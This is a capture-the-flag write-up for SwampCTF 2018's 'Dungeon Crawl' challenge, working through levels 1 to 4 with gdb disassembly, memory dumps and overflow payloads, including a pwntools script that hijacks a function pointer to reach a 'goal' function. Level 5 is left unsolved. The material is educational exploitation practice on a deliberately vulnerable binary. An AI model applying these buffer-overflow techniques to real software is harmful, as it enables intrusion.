# For Dungeon Crawl in swampctf 2018

> The nearby dungeon is full of riches, but with each level you descend, the peril increases. Will you make it to the end?
>  
> Connect
> nc chal1.swampctf.com 1337

This challenge consists of 5 different levels. All must be pwned before the flag is awarded. We start at level1 and end at level5.
We will first explore how to exploit the levels individually. After that, we will write a Python exploit script that will exploit all of them in the server given to obtain a shell.


### Level 1

Level1 is really simple.
```
0x080485e2 <+39>:	lea    eax,[ebp-0xc]
0x080485e5 <+42>:	push   eax
0x080485e6 <+43>:	push   0x8048726
0x080485eb <+48>:	call   0x80484a0 <__isoc99_scanf@plt>	; scanf("%d", store in addr [ebp-0xc])
0x080485f0 <+53>:	add    esp,0x10
0x080485f3 <+56>:	cmp    DWORD PTR [ebp-0xc],0x3da76
0x080485fa <+63>:	jne    0x8048629 <main+110>		; jump to level2 if input == 0x3da76
```

Just convert `0x3da76` to decimal (ie 252534) and we pass Level 1. On to level2.

### Level 2

```
0x080485f3 <+56>:	sub    esp,0x8
0x080485f6 <+59>:	lea    eax,[ebp-0x88]
0x080485fc <+65>:	push   eax
0x080485fd <+66>:	push   0x804874a
0x08048602 <+71>:	call   0x80484a0 <__isoc99_scanf@plt>	; scanf("%128s", store in addr [ebp-0x88])
0x08048607 <+76>:	add    esp,0x10
0x0804860a <+79>:	cmp    DWORD PTR [ebp-0xc],0xcc07c9
0x08048611 <+86>:	jne    0x8048644 <main+137>		;jump to level3 if value at addr [ebp-0xc] == 0xcc07c9
```

We want to overwrite the memory address `[ebp-0xc]` with value `0xcc07c9`. From address `[ebp-0xc]` to address `[ebp-0x88]`, there are 0x7c characters to fill.

Therefore, our input to win level2 is:
```
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\xc9\x07\xcc\x00
```

### Level 3

There is a function called `<interact>` that calls `fread( address 0xffffce34, 1 byte, 0x89 elements, stdin)`.

Original address it returns to : `0x8048623`.

We want to return to address : `0x804862d`. This is the address of the function `<goal>`.
```
(gdb) disassemble goal
Dump of assembler code for function goal:
   0x0804862d <+0>:	push   ebp
```

`fread` reads 137 characters from stdin. The return address lies in addr `0xffffcebc`. So the 137th char overrides the last byte of the return address.
```
\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x62
```

Let's see how the input looks like in memory. See how `0x8048623` becomes `0x8048662`? The '23' became '62'.
```
(gdb) x/64x $esp
0xffffce20:	0xffffce34	0x00000001	0x00000089	0xf7faa5a0
0xffffce30:	0x00000003	0x61616161	0x61616161	0x61616161
0xffffce40:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce50:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce60:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce70:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce80:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffce90:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffcea0:	0x61616161	0x61616161	0x61616161	0x61616161
0xffffceb0:	0x61616161	0x61616161	0x61616161	0x08048662
0xffffcec0:	0xf7faa3dc	0xffffcee0	0x00000000	0xf7e10637
0xffffced0:	0xf7faa000	0xf7faa000	0x00000000	0xf7e10637
0xffffcee0:	0x00000001	0xffffcf74	0xffffcf7c	0x00000000
0xffffcef0:	0x00000000	0x00000000	0xf7faa000	0xf7ffdc04
0xffffcf00:	0xf7ffd000	0x00000000	0xf7faa000	0xf7faa000
0xffffcf10:	0x00000000	0x464aaeb6	0x7bdc80a6	0x00000000
```

So our winning input will replace '23' of `0x8048623` with '2d'.
``` \x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x61\x2d
```

On to level4.

### Level 4

Like previous levels, our goal is to redirect program execution to the function `goal`.
```
(gdb) disassemble goal
Dump of assembler code for function goal:
   0x0804a47c <+0>:	push   ebp
```

The only problem is I could not find a way to redirect output to it. I did not manage to solve Level 4. After the challenge ended, I decided to checkout a writeup. The rest of this "writeup" here is just an analysis of the [writeup by PwnaSonic](https://ctftime.org/writeup/9488).

This is how Level 4 works: It asks for an action, then for the player's name. 
```
$ ./level4
----- LEVEL 4 -----
Choose an action: 5
Hey traveler, what is your name? solomon
Running action 5...
Executing 78...
Result 0
Thanks for playing solomon!
```

After the player enters an action, the program asks for his/her name. The function `<get_name>` does that.
```
0x0804a4cf <+28>:	lea    eax,[ebp-0x88]
0x0804a4d5 <+34>:	push   eax
0x0804a4d6 <+35>:	push   0x804b54e
0x0804a4db <+40>:	call   0x8048580 <__isoc99_scanf@plt> ; scanf("%127s", 0xffffcdc0)
[...]
0x0804a4f7 <+68>:	lea    eax,[ebp-0x88]
0x0804a4fd <+74>:	push   eax
0x0804a4fe <+75>:	call   0x80484f0 <strdup@plt>
0x0804a503 <+80>:	add    esp,0x10
0x0804a506 <+83>:	leave  
0x0804a507 <+84>:	ret   
```
The user's name is first stored in a local variable starting from address `0xffffcdc0`. A total of 127 characters are permitted. It is then stored in the heap. The address of the name in the heap is then returned to `<main>`. This is how the user's name is printed in `'Thanks for playing <user's name>'` just before the program exits. 

The snippet below is taken from the function `<action_dispatch> `. It is in-charge of checking that no invalid actions are given as input, and jumps to a different part of the code based on what action is requested. This is because there are 100 possible different actions, and each produces a different output.
```
   0x0804995c <+6>:	    cmp    DWORD PTR [ebp+0x8],0x63
   0x08049960 <+10>:	ja     0x804a44f <action_dispatch+2809>    ; leave if action > 100
   0x08049966 <+16>:	mov    eax,DWORD PTR [ebp+0x8]
   0x08049969 <+19>:	shl    eax,0x2
   0x0804996c <+22>:	add    eax,0x804b360
   0x08049971 <+27>:	mov    eax,DWORD PTR [eax]
   0x08049973 <+29>:	jmp    eax

```

The writeup states that the action we should choose is 73. It states that the clue lies in that choosing action 73 results in a segfault. Given an input of 7 characters, action 73 tries to call address `0x00000000` while action 5 calls the function `<execute_78>` (located in address `0x8049530`). 
```
(gdb) define hook-stop
Redefine command "hook-stop"? (y or n) y
Type commands for definition of "hook-stop".
End with a line saying just "end".
>p/x $eax
>p/x $ebp
>x/x $ebp-0xc
>end
(gdb) run
Starting program: /home/solomonbstoner/Desktop/CTF unsorted and disorganised/SwampCTF/dungeon_crawl/level4 
----- LEVEL 4 -----
Choose an action: 73
Hey traveler, what is your name? solomon
Running action 73...
$16 = 0x15
$17 = 0xffffce38
0xffffce2c:	0x00000000      ;calls address 0x00000000

[...]
```

```
(gdb) run

[...]

----- LEVEL 4 -----
Choose an action: 5
Hey traveler, what is your name? solomon
Running action 5...
$18 = 0x14
$19 = 0xffffce38
0xffffce2c:	0x08049530      ;calls address 0x8049530

Breakpoint 4, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
```

Let's give a longer input and see what happens. The address called by the function action_despatch can be overwritten with a long string *only with action 73*. Addresses called by other actions, such as action 5, will not be overwritten. There has to be a reason why.
```
(gdb) run

[...]

----- LEVEL 4 -----
Choose an action: 73
Hey traveler, what is your name? aaaaaaaaaaaaaaaaabbbbbbbbbbbbbbbbbbbbbbcccccccccccccccccccdddddddddddddddddeeeeeeeeeeeeeeeeeeeefffffffffffffffgggggggggggggggggggggggghhhhhhhhhhhhhhhhhhiiiiiiiiiiiiiiiiijjjjjjjjjjjjjjjjjjkkkkkkkkkkkkkkkkkkkkllllllllllllllllllllllll
Running action 73...
$20 = 0x15
$21 = 0xffffce38
0xffffce2c:	0x67676666      ;calls address 0x67676666

Breakpoint 4, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
(gdb) run

[...]
```

The way `<get_name>` stores the user's name does not change across different actions. That means there has to be something in the action itself that overrides the address called. (By action, I mean the choice of 100 actions the user ).

This is action 73.
```
0x0804a171 <+2075>:	sub    esp,0xc
0x0804a174 <+2078>:	push   0x804b109
0x0804a179 <+2083>:	call   0x8048540 <puts@plt>
0x0804a17e <+2088>:	add    esp,0x10
0x0804a181 <+2091>:	jmp    0x804a464 <action_dispatch+2830>
[...]
0x0804a464 <+2830>:	mov    eax,DWORD PTR [ebp-0xc]
0x0804a467 <+2833>:	call   eax
```

And this is action 5.
```
0x08049a01 <+171>:	sub    esp,0xc
0x08049a04 <+174>:	push   0x804ab7a
0x08049a09 <+179>:	call   0x8048540 <puts@plt>
0x08049a0e <+184>:	add    esp,0x10
0x08049a11 <+187>:	mov    DWORD PTR [ebp-0xc],0x8049530     ; 0x8049530 is the address of function <execute_78>
0x08049a18 <+194>:	jmp    0x804a464 <action_dispatch+2830>
[...]
0x0804a464 <+2830>:	mov    eax,DWORD PTR [ebp-0xc]
0x0804a467 <+2833>:	call   eax
```

Did you notice that action 5 has an additional instruction `mov    DWORD PTR [ebp-0xc],0x8049530`? This is the one that causes the program to call the function `<execute_78>` by overwriting the value at the memory address. Because action 73 does not have this instruction, DWORD PTR [ebp-0xc] will always be our input. Other actions like 71 and 72 have similar instructions.

```
Action 71:
0x804a13c <action_dispatch+2022>:	push   0x804b0df
0x804a141 <action_dispatch+2027>:	call   0x8048540 <puts@plt>
0x804a146 <action_dispatch+2032>:	add    esp,0x10
0x804a149 <action_dispatch+2035>:	mov    DWORD PTR [ebp-0xc],0x8048c50
0x804a150 <action_dispatch+2042>:	jmp    0x804a464 <action_dispatch+2830>
```
```
Action 72:
0x804a155 <action_dispatch+2047>:	sub    esp,0xc
0x804a158 <action_dispatch+2050>:	push   0x804b0f4
0x804a15d <action_dispatch+2055>:	call   0x8048540 <puts@plt>
0x804a162 <action_dispatch+2060>:	add    esp,0x10
0x804a165 <action_dispatch+2063>:	mov    DWORD PTR [ebp-0xc],0x8049134
0x804a16c <action_dispatch+2070>:	jmp    0x804a464 <action_dispatch+2830>
```

Let's take a look at the memory dump to confirm our theory. First, we will look at action 5's memory. Then, we'll talk about action 73's memory. Take note of the value at memory address `0xffffce2c`. That value will be loaded into `eip`.
```
Breakpoint 1, 0x0804a464 in action_dispatch ()
(gdb) p/x $ebp-0xc
$1 = 0xffffce2c
```

This memory dump from action 5 shows that the user's name obtained through function `<get_name>` is stored from memory address `0xffffcdc0` to address 0xffffce37`.
```
Breakpoint 5, 0x08049a01 in action_dispatch ()
=> 0x08049a01 <action_dispatch+171>:	83 ec 0c	sub    esp,0xc
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0x6f6c6f73	0x616e6f6d	0x61616161	0x61616161
0xffffcdd0:	0x61616161	0x62616161	0x62626262	0x62626262
0xffffcde0:	0x62626262	0x62626262	0x63636362	0x63636363
0xffffcdf0:	0x63636363	0x63636363	0x64646464	0x64646464
0xffffce00:	0x64646464	0x65656564	0x65656565	0x65656565
0xffffce10:	0x66656565	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161
0xffffce30:	0x61616161	0x62626261	0xffffce68	0x0804a55e
```

After `0x08049a11 <+187>:	mov    DWORD PTR [ebp-0xc],0x8049530` is executed, notice that the value at memory address `0xffffce2c` has been overwritten to `0x8049530`.
```
Breakpoint 2, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0xf7e62dd7	0xf7faa000	0x00000013	0xf7e57dfb
0xffffcdd0:	0xf7faad60	0x0000000a	0x00000013	0x62626262
0xffffcde0:	0xf7fe77eb	0xf7df7700	0x00000000	0xf7faad60
0xffffcdf0:	0xffffce38	0xf7fee010	0xf7e57cab	0x00000000
0xffffce00:	0xf7faa000	0xf7faa000	0xffffce38	0x08049a0e
0xffffce10:	0x0804ab7a	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x08049530
0xffffce30:	0x61616161	0x62626261	0xffffce68	0x0804a55e
```

Now, let's compare it to action 73's memory dump. Even though the user input is different, the concept remains unchanged. As expected, `<get_name>` reads the user's name into a local variable located from address `0xffffcdc0` onwards up to address `0xffffce3e` (because only a maximum of 127 characters are read). Note that the value at memory address `0xffffce2c` is `0x61616161`.

```
Breakpoint 4, 0x0804a503 in get_name ()
=> 0x0804a503 <get_name+80>:	83 c4 10	add    esp,0x10
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0x6f6c6f73	0x616e6f6d	0x61616161	0x61616161
0xffffcdd0:	0x61616161	0x62616161	0x62626262	0x62626262
0xffffcde0:	0x62626262	0x62626262	0x63636362	0x63636363
0xffffcdf0:	0x63636363	0x63636363	0x64646464	0x64646464
0xffffce00:	0x64646464	0x65656564	0x65656565	0x65656565
0xffffce10:	0x66656565	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161
0xffffce30:	0x61616161	0x62626261	0x62626262	0x00626262
0xffffce40:	0x0804b567	0xffffce58	0xffffce68	0x0804a54f
```

Nothing changes after `<get_name>` returns and `<action_dispatch>` is called. `eip` is then loaded with value `0x61616161`.
```
Breakpoint 1, 0x0804a171 in action_dispatch ()
=> 0x0804a171 <action_dispatch+2075>:	83 ec 0c	sub    esp,0xc
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0x6f6c6f73	0x616e6f6d	0x61616161	0x61616161
0xffffcdd0:	0x61616161	0x62616161	0x62626262	0x62626262
0xffffcde0:	0x62626262	0x62626262	0x63636362	0x63636363
0xffffcdf0:	0x63636363	0x63636363	0x64646464	0x64646464
0xffffce00:	0x64646464	0x65656564	0x65656565	0x65656565
0xffffce10:	0x66656565	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161
0xffffce30:	0x61616161	0x62626261	0xffffce68	0x0804a55e
0xffffce40:	0x00000049	0xffffce58	0xffffce68	0x0804a54f

[...]

Breakpoint 2, 0x0804a464 in action_dispatch ()
=> 0x0804a464 <action_dispatch+2830>:	8b 45 f4	mov    eax,DWORD PTR [ebp-0xc]
(gdb) x/64xw 0xffffcdc0
0xffffcdc0:	0xf7e62dd7	0xf7faa000	0x00000014	0xf7e57dfb
0xffffcdd0:	0xf7faad60	0x0000000a	0x00000014	0x62626262
0xffffcde0:	0xf7fe77eb	0xf7df7700	0x00000000	0xf7faad60
0xffffcdf0:	0xffffce38	0xf7fee010	0xf7e57cab	0x00000000
0xffffce00:	0xf7faa000	0xf7faa000	0xffffce38	0x0804a17e
0xffffce10:	0x0804b109	0x66666666	0x66666666	0x6f736666
0xffffce20:	0x6f6d6f6c	0x6161616e	0x61616161	0x61616161

[...]

Program received signal SIGSEGV, Segmentation fault.
0x61616161 in ?? ()
```

Now that we have a way to redirect program execution, we can execute function `<goal>`. It's address must be in memory address `0xffffce2c`. In other words, it's the 109th to 112th characters in the user input.
```
$ echo `python -c "print '73' + '\n' + 'A' * 108 + '\\x7c\\xa4\\x04\\x08'"` > input\ level4
$ cat input\ level4 | ./level4
----- LEVEL 4 -----
Choose an action: Hey traveler, what is your name? Running action 73...
Excellent reverse engineering! Level 4 complete.
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: Your chosen path leads you...straight down a mine shaft. You perish.
```

Alternatively, I could use pwntools in Python. 
```
from pwn import *

ADDR_OF_GOAL = p32(0x804a47c)

exploit = "\x61" * 108 + ADDR_OF_GOAL

p = process('./level4')
print p.recvuntil('action: ')
p.sendline('73')
log.info('Choosing action 73.')

print p.recvuntil('your name? ')
p.sendline(exploit)
log.info('Sent exploit: ' + exploit)
print('\n')
print p.recv()		#Since Level5 was started, it shows that we successfully pwned level4.
```

This is the output of running the Python script.
```
$ python input\ level4.py 
[+] Starting local process './level4': pid 6517
----- LEVEL 4 -----
Choose an action: 
[*] Choosing action 73.
Hey traveler, what is your name? 
[*] Sent exploit: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|\xa4\x0



Running action 73...
Excellent reverse engineering! Level 4 complete.
----- LEVEL 5 -----
This is your final task - defeat this level and you will be rewarded.
Choose your path to victory...

Choice [0 exit][1 small][2 large][3 format]: 
[*] Stopped process './level4' (pid 6517)

```

Now, onwards to level5.

### Level 5

Level 5 has not been pwned yet.